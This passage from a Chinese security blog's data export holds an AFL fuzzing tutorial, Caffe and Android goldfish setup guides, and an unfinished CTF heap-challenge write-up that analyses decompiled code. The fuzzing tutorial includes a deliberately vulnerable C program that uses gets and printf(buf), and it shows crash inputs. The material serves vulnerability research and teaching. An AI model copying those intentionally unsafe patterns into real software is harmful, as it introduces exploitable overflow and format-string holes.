21090 Nov  5  2017 afl-as.h\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-clang -> afl-gcc\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-clang++ -> afl-gcc\n-rwxr-xr-x  1  500  500  11392 Nov  5  2017 afl-cmin\n-rwxr-xr-x  1 root root 582872 Jun  2 09:46 afl-fuzz\n-rw-r--r--  1  500  500 206076 Nov  5  2017 afl-fuzz.c\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-g++ -> afl-gcc\n-rwxr-xr-x  1 root root  35376 Jun  2 09:46 afl-gcc\n-rw-r--r--  1  500  500   8597 Nov  5  2017 afl-gcc.c\n-rwxr-xr-x  1 root root  32240 Jun  2 09:46 afl-gotcpu\n-rw-r--r--  1  500  500   5336 Nov  5  2017 afl-gotcpu.c\n-rwxr-xr-x  1  500  500   4913 Nov  5  2017 afl-plot\n-rwxr-xr-x  1 root root  76840 Jun  2 09:46 afl-showmap\n-rw-r--r--  1  500  500  16527 Nov  5  2017 afl-showmap.c\n-rwxr-xr-x  1 root root 106280 Jun  2 09:46 afl-tmin\n-rw-r--r--  1  500  500  25235 Nov  5  2017 afl-tmin.c\n-rwxr-xr-x  1  500  500   3655 Nov  5  2017 afl-whatsup\n-rw-r--r--  1  500  500  12565 Nov  5  2017 alloc-inl.h\nlrwxrwxrwx  1 root root      6 Jun  2 09:46 as -> afl-as\n-rw-r--r--  1  500  500  11216 Nov  5  2017 config.h\n-rw-r--r--  1  500  500   6574 Nov  5  2017 debug.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 dictionaries\ndrwxr-xr-x  4  500  500   4096 Nov  5  2017 docs\ndrwxr-xr-x 12  500  500   4096 Nov  5  2017 experimental\n-rw-r--r--  1  500  500   2065 Nov  5  2017 hash.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libdislocator\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libtokencap\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 llvm_mode\n-rw-r--r--  1  500  500   6987 Nov  5  2017 Makefile\ndrwxr-xr-x  3  500  500   4096 Nov  5  2017 qemu_mode\nlrwxrwxrwx  1  500  500     24 Nov  5  2017 QuickStartGuide.txt -> docs/QuickStartGuide.txt\nlrwxrwxrwx  1  500  500     11 Nov  5  2017 README -> docs/README\ndrwxr-xr-x  6  500  500   4096 Nov  5  2017 testcases\n-rw-r--r--  1  500  500    789 Nov  5  2017 test-instr.c\n-rw-r--r--  1  500  500   2292 Nov  5  2017 types.h\n```\n\n可以看到afl安装后，文件夹下多了些二进制文件，是不是很简单。但是，在使用AFL进行fuzz测试前，一定要设置一下**core_pattern**，否则会报错哦。\n\n```shell\nroot@x:~/afl-test# cat /proc/sys/kernel/core_pattern\n|/usr/share/apport/apport %p %s %c %d %P\nroot@x:~/afl-test# echo core > /proc/sys/kernel/core_pattern\nroot@x:~/afl-test# cat /proc/sys/kernel/core_pattern\ncore\n```\n\n## 1.2 跑起来看看\n\n测试程序的代码使用了先知社区的示例代码，如下。平时我们编译c代码使用的是gcc，现在为了使用AFL进行fuzz，我们必须使用1.1节中编译出来的afl-gcc对目标代码进行插桩编译。\n\n```c\n#include <stdio.h> \n#include <stdlib.h> \n#include <unistd.h> \n#include <string.h> \n#include <signal.h> \n\nint vuln(char *str)\n{\n    int len = strlen(str);\n    if(str[0] == 'A' && len == 66)\n    {\n        raise(SIGSEGV);\n        //如果输入的字符串的首字符为A并且长度为66，则异常退出\n    }\n    else if(str[0] == 'F' && len == 6)\n    {\n        raise(SIGSEGV);\n        //如果输入的字符串的首字符为F并且长度为6，则异常退出\n    }\n    else\n    {\n        printf(\"it is good!\\n\");\n    }\n    return 0;\n}\n\nint main(int argc, char *argv[])\n{\n    char buf[100]={0};\n    gets(buf);//存在栈溢出漏洞\n    printf(buf);//存在格式化字符串漏洞\n    vuln(buf);\n\n    return 0;\n}\n```\n\n接下来，需要做以下三件事：\n\n（1）使用afl-gcc编译目标代码（即插桩）\n\n```shell\n$ afl-gcc test.c -g -o test\n```\n\n（2）新建测试用例（测试用例即待测程序的输入，可以随意给个文件作为起始用例。AFL会在此用例的基础上进行变异，好的测试用例有助于更快发现更多bug）\n\n```shell\n$ mkdir testcase\n$ cd testcase\n$ vim file123\n\t123\n\tqwe\n```\n\n（3）输出文件夹（发现的bug等信息会输出到该目录下）\n\n```shell\n$ mkdir output\n```\n\n最后，指定好以上三项的位置，执行如下命令，就会进入AFL主面板开始fuzz啦\n\n```shell\nafl-fuzz -i testcase/ -o output/ ./test\n```\n\n这里给一下我fuzz完成后（ctrl +c）的情况：\n\n```shell\nroot@x:~/afl-test# afl-fuzz -i testcase/ -o output/ ./test\nafl-fuzz 2.52b by <lcamtuf@google.com>\n[+] You have 8 CPU cores and 1 runnable tasks (utilization: 12%).\n[+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt.\n[*] Checking CPU core loadout...\n[+] Found a free CPU core, binding to #0.\n[*] Checking core_pattern...\n[*] Setting up output directories...\n[+] Output directory exists but deemed OK to reuse.\n[*] Deleting old session data...\n[+] Output dir cleanup successful.\n[*] Scanning 'testcase/'...\n[+] No auto-generated dictionary tokens to reuse.\n[*] Creating hard links for all input files...\n[*] Validating target binary...\n[*] Attempting dry run with 'id:000000,orig:file1'...\n[*] Spinning up the fork server...\n[+] All right - fork server is up.\n    len = 8, map size = 5, exec speed = 306 us\n[+] All test cases processed.\n\n[+] Here are some useful stats:\n\n    Test case count : 1 favored, 0 variable, 1 total\n       Bitmap range : 5 to 5 bits (average: 5.00 bits)\n        Exec timing : 306 to 306 us (average: 306 us)\n\n[*] No -t option specified, so I'll use exec timeout of 20 ms.\n[+] All set and ready to roll!\n\n                        american fuzzy lop 2.52b (test)\n\n┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐\n│        run time : 0 days, 0 hrs, 24 min, 9 sec       │  cycles done : 2574   │\n│   last new path : 0 days, 0 hrs, 24 min, 9 sec       │  total paths : 3      │\n│ last uniq crash : 0 days, 0 hrs, 14 min, 10 sec      │ uniq crashes : 6      │\n│  last uniq hang : none seen yet                      │   uniq hangs : 0      │\n├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤\n│  now processing : 2 (66.67%)        │    map density : 0.01% / 0.01%         │\n│ paths timed out : 0 (0.00%)         │ count coverage : 1.00 bits/tuple       │\n├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤\n│  now trying : splice 9              │ favored paths : 3 (100.00%)            │\n│ stage execs : 47/48 (97.92%)        │  new edges on : 3 (100.00%)            │\n│ total execs : 5.41M                 │ total crashes : 385k (6 unique)        │\n│  exec speed : 3330/sec              │  total tmouts : 1 (1 unique)           │\n├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤\n│   bit flips : 0/128, 0/125, 0/119                   │    levels : 2          │\n│  byte flips : 0/16, 0/13, 0/7                       │   pending : 0          │\n│ arithmetics : 2/896, 0/129, 0/9                     │  pend fav : 0          │\n│  known ints : 0/78, 0/339, 0/308                    │ own finds : 2          │\n│  dictionary : 0/0, 0/0, 0/0                         │  imported : n/a        │\n│       havoc : 4/2.31M, 2/3.09M                      │ stability : 100.00%    │\n│        trim : 83.10%/16, 0.00%                      ├────────────────────────┘\n^C────────────────────────────────────────────────────┘          [cpu000: 23%]\n\n+++ Testing aborted by user +++\n[+] We're done here. Have a nice day!\n```\n\n## 1.3 分析结果\n\nfuzz完成后，根据AFL面板的信息我们知道有6个crash，因此我们进入output目录去分析\n\n```shell\nroot@x:~/afl-test/output# ls -al\ntotal 108\ndrwxr-xr-x 5 root root  4096 Jun  2 10:15 .\ndrwxr-xr-x 4 root root  4096 Jun  2 10:08 ..\ndrwx------ 2 root root  4096 Jun  2 10:25 crashes\n-rw------- 1 root root     1 Jun  2 10:39 .cur_input\n-rw------- 1 root root 65536 Jun  2 10:16 fuzz_bitmap\n-rw------- 1 root root   739 Jun  2 10:39 fuzzer_stats\ndrwx------ 2 root root  4096 Jun  2 10:15 hangs\n-rw------- 1 root root 15250 Jun  2 10:39 plot_data\ndrwx------ 3 root root  4096 Jun  2 10:15 queue\n```\n\n- crashes/ 文件夹中存放了fuzz过程中产生的crash样例\n\n- hangs/ 文件夹中存放了fuzz过程中产生的超时样例\n\n- queue/ 文件夹中存放了fuzz过程中不同执行路径的测试用例\n\n使用`xxd`命令查看产生的6个crash样例，然后可以将样例作为输入用gdb调试test程序。\n\n```shell\nroot@x:~/afl-test/output/crashes# xxd id:000000,sig:06,src:000000,op:havoc,rep:64\n00000000: 1f20 0820 fe1f 2004 0020 200c 0064 1ffe  . . .. ..  ..d..\n00000010: 017f 2033 ff20 2000 180b 2020 2008 20e2  .. 3.  ...   . .\n00000020: 1f20 e21f ff01 00ff ff20 2020 2002 0024  . .......    ..$\n00000030: ff00 0000 0000 0100 203a 200c 20e2 1f01  ........ : . ...\n00000040: 2020 0019 0110 510b 2020 2002 0020 2020    ....Q.   ..\n00000050: 2020 2020 2020 2020 2020 2020 2020 2020\n00000060: 2020 2020 2020 2020 2020 2020 2020 0820                .\n00000070: 2020 0c20 e21f 2002 7f80 2020 6b20 0101    . .. ...  k ..\n00000080: 0101 0101 1d01 0101 0101 0101 0101 0101  ................\n00000090: 0101 0101 0101 0101 0101 0101 40ff 2080  ............@. .\nroot@x:~/afl-test/output/crashes# xxd id:000001,sig:11,src:000002,op:arith8,pos:0,val:-28\n00000000: 4662 6262 627f 001a                      Fbbbb...\nroot@x:~/afl-test/output/crashes# xxd id:000002,sig:06,src:000002,op:havoc,rep:128\n00000000: 3685 c13e 3e3e 002f 3e3e 203e 3e6a 3e3e  6..>>>./>> >>j>>\n00000010: 3ee4 343e 3e3e 3e53 3d5b 146a 3e3e 2e3e  >.4>>>>S=[.j>>.>\n00000020: 3e3e 3e4e 3e6a 3e5c 273e 3e3e 3e3e 6a3e  >>>N>j>\\'>>>>>j>\n00000030: 3e8c 3e3e 3e3e 4a3e 6a3e 3e27 d9c5 a8c5  >.>>>>J>j>>'....\n00000040: 5314 533e 3e1d 3e3e 3e3e 3e3e 3e3e 3e3e  S.S>>.>>>>>>>>>>\n00000050: 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e  >>>>>>>>>>>>>>>>\n00000060: 3e3e 3e3e 3e2f 3e3e 343e 3e6a 3e3e 0080  >>>>>/>>4>>j>>..\n00000070: 3e3e 3e27 fb9c 9c9c 9c9c 9c9c 9c9c c5c5  >>>'............\n00000080: c5a6 c5e0 7fff                           ......\nroot@x:~/afl-test/output/crashes# xxd id:000003,sig:06,src:000001+000002,op:splice,rep:4\n00000000: 2532 6e5a 627f fc19                      %2nZb...\nroot@x:~/afl-test/output/crashes# xxd id:000004,sig:06,src:000001,op:havoc,rep:128\n00000000: 4106 00f2 5fdf 03a0 c5f6 dfdf 40a0 dff4  A..._.......@...\n00000010: f5ff e5f4 f4fe 04f5 f4f4 f4f4 f4f4 f4f4  ................\n00000020: 0ef5 f4ff 800d f4b4 f400 f4f4 0edb eadf  ................\n00000030: f8df dfe7 f400 eadd dfe7 df02 dff8 00d7  ................\n00000040: dfdf 01df dfdf ecdb eadf f8df dfe7 dfdf  ................\n00000050: dff8 1ad7 dfdf 01da dfdf dedf dfdf dfdf  ................\n00000060: dfdf dfdf dfdf dfdf dfdf dfde dfdf dfde  ................\n00000070: ed00 e3e3 e316 0d00 0000 1000 00c0 dfe7  ................\n00000080: dfdf df00 d701 dfd6 0e                   .........\nroot@x:~/afl-test/output/crashes# xxd id:000005,sig:11,src:000002+000001,op:splice,rep:16\n00000000: 4132 800f fe0f 0f0f 0f0f 220f 0f0f 0f0f  A2........\".....\n00000010: 0f0f 0f0f 0f0f 0f0f 0f0f 0ef0 0f22 0f0f  .............\"..\n00000020: 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f  ................\n00000030: 0f0f 0f0f 0f0f 0f0f 0f0f 0f7f ff64 0f0f  .............d..\n00000040: fc0e 000f 0f0f 0f0f 0fff                 ..........\n```\n\n## 1.4 继续已停止的fuzz测试\n\n```shell\nafl-fuzz -i- -o output ./test\n```\n\n## 1.5 结合ASAN的fuzz\n\n> ASAN只推荐在32位机器上使用。如果在64位机器上使用，也需将AFL编译成32位的。\n\n ```\nMethod 1. set AFL_USE_ASAN=1 before calling ‘make clean all’\nMethod 2. add -fsanitize=address option into makefile\n ```\n\n## 1.6 文件fuzz\n\n> 1.2和1.3节讲的是从stdin读取输入的目标程序，这里补充一下从文件读取输入的目标程序，以 `readelf -a xxfile` 为例。\n\n有源码插桩：\n\n```\nafl-fuzz -i in/ -o out/ ./readelf -a @@\n```\n\n无源码插桩：\n\n```\nafl-fuzz -i in/ -o out/ -Q ./readelf -a @@\n```\n\n\n\n# 2 无源码AFL fuzz\n\n> 无源码时，即无法对源码使用功能afl-gcc/afl-g++进行插桩编译时，整个fuzz过程会变得异常缓慢。但确实没有源码的情况下可使用该方法。\n\n**步骤1**：编译支持无源码fuzz的AFL\n\n在afl源码目录下：\n\n```\ncd qemu_mode\n./build_qemu_support.sh\ncd ..\nmake install \n```\n\n**步骤2**：跟1.2和1.3节一样，只不过有两点差异：\n\n- 待测程序是未经afl-gcc插桩编译过的，如使用gcc编译\n\n- 执行afl-fuzz命令时多加了一个`-Q`参数\n\n```\nafl-fuzz -i testcase/ -o output/ -Q ./test\n```\n\n# 3 AFL文档学习\n\n\n\nafl面板介绍：\n\nhttps://lcamtuf.coredump.cx/afl/status_screen.txt\n\n\n\n# 4 参考文档\n\n[初探AFL-Fuzz](https://xz.aliyun.com/t/4314)\n\n[小白初学AFL(American Fuzzy Lop)](https://blog.csdn.net/weixin_39448417/article/details/99703723)\n\n[AFL文件变异一览](http://rk700.github.io/2018/01/04/afl-mutations/)\n\n[AFL(American Fuzzy Lop) Cautions](https://stfpeak.github.io/2017/06/12/AFL-Cautions/)","categories":["Fuzzing"]},{"title":"caffe的安装与使用","url":"/2020/06/30/caffe/","content":"\n# 1 caffe安装\n\n## 1.1 安装依赖\n虚拟机为ubuntu 16.04，仅cpu。\n按照官网安装相应依赖（https://caffe.berkeleyvision.org/install_apt.html），执行了一下几条命令：\n\n```shell\n通用依赖：\nsudo apt-get install libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libhdf5-serial-dev protobuf-compiler\nsudo apt-get install --no-install-recommends libboost-all-dev\n\nblas依赖：\nsudo apt-get install libatlas-base-dev\n\npython依赖：\nsudo apt-get install python-dev\n\n以下依赖不知是否必须安装：\nsudo apt-get install libgflags-dev libgoogle-glog-dev liblmdb-dev\n```\n\n## 1.2 源码安装\n源码地址：https://github.com/BVLC/caffe\n官网方法：https://caffe.berkeleyvision.org/installation.html#compilation\n参考中文链接：https://www.jianshu.com/p/8878d2bdaf99\n### 1.2.1 编译源码\n```shell\nunzip caffe-master.zip\ncd caffe-master\ncp Makefile.config.example Makefile.config\n```\n更改Makefile.config文件中，如下行：\n```shell\n`CPU_ONLY := 1`前的注释符“#”去掉\n将：\nINCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include\nLIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib\n修改为：\nINCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial\nLIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu/hdf5/serial\n```\n执行如下三条命令完成安装：\n```shell\nsudo make all\nsudo make test\nsudo make runtest\n```\n### 1.2.2 python环境\n\n```shell\n安装pip：\nsudo apt-get install python-pip\n\n安装python借口依赖库：\nsudo apt-get install gfortran\ncd /home/bling/caffe-master/python\nfor req in $(cat requirements.txt); do pip install $req; done\n\n验证：\nsudo pip install -r requirements.txt\n\n设置环境变量：\nsudo vim ~/.bashrc\n\texport PYTHONPATH=/home/bling/caffe-master/python:$PYTHONPATH\nsource ~/.bashrc\n```\n\n安装pycaffe\n```shell\ncd /home/bling/caffe-master/\nsudo make pycaffe\n\n验证使用，进python环境，输入\nimport caffe\n```\n\n# 使用示例\nMNIST tutorial：\nhttps://caffe.berkeleyvision.org/gathered/examples/mnist.html\n\nreference ImageNet model tutorial：\nhttps://caffe.berkeleyvision.org/gathered/examples/imagenet.html","categories":["AI"]},{"title":"android 模拟器 goldfish 环境搭建","url":"/2020/06/30/goldfish/","content":"\n# 环境准备\n\n## 硬件及主机系统\n\n- 使用AVD时需要硬件支持 KVM 。因此先在主机 bios 中将虚拟化设置开启。\n- x86架构的主机，安装了 Ubuntu 22.04 操作系统。\n\n检查系统是否支持虚拟化的两条命令：\n```shell\n$ kvm-ok\nINFO: /dev/kvm exists\nKVM acceleration can be used\n\n$ egrep -c '(vmx|svm)' /proc/cpuinfo\n8\n```\n\n## 安装 java jdk\n\n```\nsudo apt update\nsudo apt install openjdk-8-jdk\n```\n\n参考： [Linux之Ubuntu18.04安装Java JDK8的三种方式](https://blog.csdn.net/zbj18314469395/article/details/86064849)\n\n## 配置交叉编译环境\n\n首先，需要下载交叉编译器，有以下几种方式：\n\n- 使用谷歌提供的 [android llvm](https://android.googlesource.com/toolchain/llvm-project) 或者 [android gcc](https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/)\n    \n    官方提供的独立编译工具链 android gcc [已被删除](https://stackoverflow.com/questions/71281064)，需通过追溯提交记录，找到老版本。（也就只有 gcc 4.8 和 gcc 4.9）\n\n- 使用 [android NDK](https://developer.android.com/ndk/downloads?hl=zh-cn) 中的交叉编译器\n\n根据需要，在以上链接中选择不同的交叉编译器（32位或64位）\n\n下载到本地后，配置环境变量\n\n```shell\nvim ~/.bashrc\n\nexport PATH=xxx/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin:$PATH\nexport PATH=xxx/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin:$PATH\nexport CROSS_COMPILE=aarch64-linux-android-\n\nsource ~/.bashrc\n```\n\n## 安装 linux 版 android studio\n\n有两种方式可以安装android studio\n\n- 离线方式 - 推荐\n\n    在 [android studio官网](https://developer.android.com/studio) 下载包，本地解压后，进入 `android-studio/bin/` 目录执行 `./studio.h` 即可启动AS。\n\n- 在线方式\n\n    参考：https://rotolo.dev/android-studio/\n\n    ```shell\n    sudo apt-add-repository ppa:paolorotolo/android-studio \n    sudo apt-get update\n    sudo apt-get install android-studio\n    ```\n\n## 配置 android studio\n\n- 有网络的情况\n\n    配置AS的代理，直接连接google\n\n    这种方式下的sdk，ndk，AVD system-image等等都可以在线下载，很方便。\n\n- 没有网络的情况\n\n    手工下载 android sdk 或者 system images 等等，按照这个网站的指导：https://my.oschina.net/u/862582/blog/349263\n\n    另一个手工下载sdk参考：https://www.jianshu.com/p/86b9c57bf838\n\n    手工下载ndk参考：https://www.jianshu.com/p/abdad7fd1367\n\nsdk和ndk等等配置完成后，再配置ubuntu环境变量，将以下几个目录添加到环境变量中：emulator/ platform-tools/ ndk/ avd/\n\n```shell\nvim ~/.bashrc\n\nexport PATH=/xxx/xxx/android-sdk-linux/emulator:$PATH\nexport PATH=/xxx/xxx/android-sdk-linux/platform-tools:$PATH\nexport PATH=/xxx/xxx/android-sdk-linux/ndk:$PATH\nexport PATH=~/.android/avd:$PATH\n\nsource ~/.bashrc\n```\n\n## 创建 AVD\n\n使用AVD manager创建完虚拟设备后，在`~/.android/avd`目录下会有xxx.ini和一个xxx.avd。这个xxx是我们后面启动 android 模拟器需要用到的。\n\n模拟器相关命令参考：https://developer.android.com/studio/run/emulator-commandline?hl=zh-cn\n\n## 加载低版本kernel\n\n最新版的android studio和sdk均不支持加载版本<3.10的内核，想加载低版本内核做实验的话，可使用 [此链接](http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz) 提供的sdk。\n\n`android` - 命令，启动android sdk管理器\n\n`android avd` - 命令，启动avd manager\n\n`emulator -avd xxx` - 命令，跟最新版相同\n\n# 编译goldfish内核\n\n通过如下命令，下载goldfish内核源码，并完成编译\n```shell\nmkdir goldfish4.4 \ncd goldfish4.4 \n## 创建一个out44目录，用来存放编译输出\nmkdir out4.4        \ngit clone https://android.googlesource.com/kernel/goldfish.git\ncd goldfish\ngit branch -a\n## 从goldfish中拉出kernel4.4分支\ngit checkout -b android-goldfish-4.4-dev remotes/origin/android-goldfish-4.4-dev    \n## arch/arm64/configs目录下有编译配置文件defconfig和ranchu64_defconfig，我们使用ranchu64_defconfig\nmake ARCH=arm64 O=../out44 ranchu64_defconfig\n## 如果后面需要调试该内核，这里最好改一下.config，将CONFIG_DEBUG_RODATA和CONFIG_RANDOMIZE_BASE设置为不开启\nmake ARCH=arm64 O=../out44/ -j16\n```\n\n编译完成后，如果需要更改配置（如允许内核加载自定义ko模块），操作如下\n\n```shell\n## 图形化配置内核选项\nmake ARCH=arm64 O=../out44/  menuconfig\n## 配置变化的时候执行清理一下\nmake mrproper\n## 开始编译\nmake ARCH=arm64 O=../out44/ -j16\n```\n\n编译生成的内核文件在如下位置：`out4.4/arch/arm64/boot/Image.gz`\n\n# 使用编译的内核启动avd虚拟设备\n\n执行以下命令以自编译的内核启动虚拟机\n\n```shell\nemulator -avd KernelTest -no-window -no-audio -show-kernel -kernel /.../out4.4/arch/arm64/boot/Image.gz -no-snapstorage\n```\n","categories":["Android"]},{"title":"calc heap","url":"/2020/06/25/calc-heap/","content":"\n# 1 分析\n\n[题目二进制](https://xuanxuanblingbling.github.io/assets/attachment/calc)\n\n写write up之前，要吐槽一下，这又是一道做得让我怀疑人生的题。前后拖了一个月才狠下心把这题终于终于做完了。一点一点积累，希望一年或者几年后能看到自己的进步。\n\n## 1.1 查看程序基本信息\n\n```shell\n$ file calc\ncalc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=454ff27c25ea5028bffdcfaf81e1c178d5cbce3a, stripped\n$ checksec calc\n[*] '/mnt/hgfs/VMshare/calc/calc'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n\n## 1.2 运行试试\n\n```shell\n$ ./calc\n> 1\n1\n> 3\n3\n> 1111\n1111\n> 2+2\ninvalid number\n> 2 + 3\n5\n```\n\n## 1.3 IDA逆向\n\n如下是IDA逆向出来，main函数中的主要代码，对这段代码进行分析。\n\n```c\n  v13 = __readgsdword(0x14u);\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stderr, 0, 2, 0);\n  dword_804D0B0 = sub_804A929();\t\t// 1\n  dword_804D0B4 = sub_804A8E9();\t\t// 2\n  dword_804D0AC = sub_804A8E9();\t\t// 3\n  v0 = sub_804A83F(\"add\", (int)sub_80494AA);\t//4\n  sub_804A946(dword_804D0B0, \"add\", v0);\t\t//5\n  v1 = sub_804A83F(\"sub\", (int)sub_8049C81);\t//6\n  sub_804A946(dword_804D0B0, \"sub\", v1);\t\t//7\n  v2 = sub_804A83F(\"mul\", (int)sub_8049A0E);\n  sub_804A946(dword_804D0B0, \"mul\", v2);\n  v3 = sub_804A83F(\"div\", (int)sub_8049DED);\n  sub_804A946(dword_804D0B0, \"div\", v3);\n  v4 = sub_804A83F(\"mod\", (int)sub_8049F90);\n  sub_804A946(dword_804D0B0, \"mod\", v4);\n  v5 = sub_804A83F(\"not\", (int)sub_804A135);\n  sub_804A946(dword_804D0B0, \"not\", v5);\n  v6 = sub_804A83F(\"int\", (int)sub_8049854);\n  sub_804A946(dword_804D0B0, \"int\", v6);\n  v7 = sub_804A83F(\"exit\", (int)sub_804A688);\n  sub_804A946(dword_804D0B0, \"exit\", v7);\n  v8 = sub_804A83F(\"equals\", (int)sub_804A3C2);\n  sub_804A946(dword_804D0B0, \"equals\", v8);\n  v9 = sub_804A83F(\"type\", (int)sub_804A61E);\n  sub_804A946(dword_804D0B0, \"type\", v9);\n  v10 = sub_804A83F(\"len\", (int)sub_804A308);\n  sub_804A946(dword_804D0B0, \"len\", v10);\n  while ( 1 )\t\t//8\n  {\n    memset(&s, 0, 0x100u);\n    printf(\"> \");\n    if ( !fgets(&s, 256, stdin) )\t\t//9\n      break;\n    v11 = strrchr(&s, '\\n');\t\t//10\n    if ( v11 )\n      *v11 = 0;\n    sub_8048BC1(&s);\t\t//11\n  }\n```\n\n### line 1 2 3 \n\n```c\n  dword_804D0B0 = sub_804A929();\t\t// 1\n  dword_804D0B4 = sub_804A8E9();\t\t// 2\n  dword_804D0AC = sub_804A8E9();\t\t// 3\n```\n\ndword_804D0B0，dword_804D0B4，dword_804D0AC都是bss段的变量，各占4个字节。这三个变量分别接受sub_804A929()和sub_804A8E9()这两个函数的返回值。下面我们来看看这两个函数。\n\n```shell\n.bss:0804D0AC dword_804D0AC   dd ?                   \n.bss:0804D0AC                                      \n.bss:0804D0B0 ; int dword_804D0B0\n.bss:0804D0B0 dword_804D0B0   dd ?                  \n.bss:0804D0B0                                        \n.bss:0804D0B4 dword_804D0B4   dd ?   \n```\n\n- sub_804A929()\n\n  这个函数只有一句`return calloc(0x10u, 1u)`，申请大小为0x10的堆空间，并将堆的地址返回给dword_804D0B0。\n\n- sub_804A8E9()\n\n  这个函数中申请了0x84大小的堆空间，并返回。因此dword_804D0B4，dword_804D0AC分别指向大小为0x84的堆。\n\n![](image-20200626202214785.png)\n\n### line 4 5 6 7\n\n这四行以及之后的许多行都是在重复4 5行的函数，因此分析完前两个就能推断之后的操作。\n\n先看4 5 行，涉及两个函数sub_804A83F()和sub_804A946()，以及一个函数指针sub_80494AA和一个bss段的变量dword_804D0B0。接下来重点分析这两个函数。\n\n```c\n  v0 = sub_804A83F(\"add\", (int)sub_80494AA);\t//4\n  sub_804A946(dword_804D0B0, \"add\", v0);\t\t//5\n```\n\n#### sub_804A83F()\n\n函数定义如下：\n\n```c\n_DWORD *__cdecl sub_804A83F(char *s, int a2)\n{\n  _DWORD *v2; // ST1C_4\n\n  v2 = calloc(0x10u, 1u);\n  *v2 = strdup(s);\n  v2[2] = a2;\n  v2[1] = \"function\";\n  v2[3] = 0;\n  return v2;\n}\n```\n\n输入为一个字符串和一个整型值（函数指针的地址）。函数内先申请一个大小为0x10的堆空间（*v2指向该堆空间），然后将输入的字符串地址（strdup申请了一个堆空间用来存放字符串）放在v2[0]；v2[1]处存放字符串\"function\"的地址，标志这是一个function堆；将传入的函数指针地址放在v2[2]；v2[3]置空。最后将该堆块返回给上一层调用者。\n\n```\nv2堆块如下。以第4行为例，heap1中存放着字符串“add”；string1处的字符串为“function”；function1是一个处理add逻辑的函数。\n|------------|\n| &heap1     |\n|------------|\n| &string1   |\n|------------|\n| &function1 |\n|------------|\n| 0          |\n|------------|\n```\n\n#### sub_804A946()\n\n以add为例，该函数的参数分别为dword_804D0B0（bss段的一个值，为一个堆块地址）， \"add\"字符串,，以及上一个函数sub_804A83F()的返回值（一个0x10大小的堆块）。sub_804A946()函数定义如下，我在函数中标记了注释。\n\n```c\nint __cdecl sub_804A946(int a1, char *s, int a3)\n{\n  int result; // eax\n  size_t i; // [esp+4h] [ebp-14h]\n  int v5; // [esp+8h] [ebp-10h]\n  signed int v6; // [esp+Ch] [ebp-Ch]\n/*检查dword_804D0B0堆块第一个字节指向的堆块是否为空。如果是空，就申请一个大小为0x10的堆，并在该堆块偏移8字节处写入字符‘a’；如果非空，则跳过执行下面的部分。*/\n  if ( !*a1 )\t\n  {\n    *a1 = calloc(0x10u, 1u);\n    *(*a1 + 8) = *s;\n  }\n/*v5赋值dword_804D0B0堆块第一个字节指向的堆块地址（即*a1），v6赋值传入字符串s的长度。*/\n  v5 = *a1;\n  v6 = strlen(s);\n/*进入for循环处理字符串s*/\n  for ( i = 0; i <= v6; ++i )\n  {\n/*1、判断dword_804D0B0堆块指向的堆块偏移4字节的位置是否不为空；2、判断dword_804D0B0堆块指向的堆块地址偏移8字节处是否跟字符串的第i个字符不相等。两个同时满足时执行v5 = *(v5 + 4)；其中一个不满足则跳过该操作，继续执行后续部分。*/\n    while ( *(v5 + 4) && *(v5 + 8) != s[i] )\n      v5 = *(v5 + 4);\n/*如果此时v5堆块偏移8字节的位置跟s[i]的值不相等，则进入if语句中处理；如果两者相等，则复用该堆块，继续处理下一个字符。*/\n    if ( *(v5 + 8) != s[i] )\n    {\n/*新申请一个0x10大小的堆块，并将堆块地址写到v5堆块偏移4字节的位置。然后将s[i]写到新申请的堆块偏移8字节的位置。然后让v5指向新申请的堆块。*/\n      *(v5 + 4) = calloc(0x10u, 1u);\n      *(*(v5 + 4) + 8) = s[i];\n      v5 = *(v5 + 4);\n/**/\n      while ( strlen(s) > i )\n      {\n        *v5 = calloc(0x10u, 1u);\n        *(*v5 + 8) = s[++i];\n        v5 = *v5;\n      }\n      break;\n    }\n/*如果s[i]为空，即到了字符串的结束位置，则结束循环。*/\n    if ( !s[i] )\n      break;\n/*如果*v5为空，新申请一个0x10大小的堆块，并让*v5指向该对堆块。然后将s[i+1]处的字符写到新申请堆块偏移8字节的位置。*/\n    if ( !*v5 )\n    {\n      *v5 = calloc(0x10u, 1u);\n      *(*v5 + 8) = s[i + 1];\n    }\n/*让v5指向*v5指向的堆块*/\n    v5 = *v5;\n  }\n/*上述循环将所有的字符全部处理完毕后，将v5当前指向堆块的地址给result*/\n  result = v5;\n/*将a3（即sub_804A83F()返回的堆块）的地址写到v5堆块内偏移12字节的位置*/\n  *(v5 + 12) = a3;\n  return result;\n}\n```\n\n执行完4 5 6 7行后，会形成如下图所示的堆空间关系：\n\n![](image-20200626232425175.png)\n\n### line 8 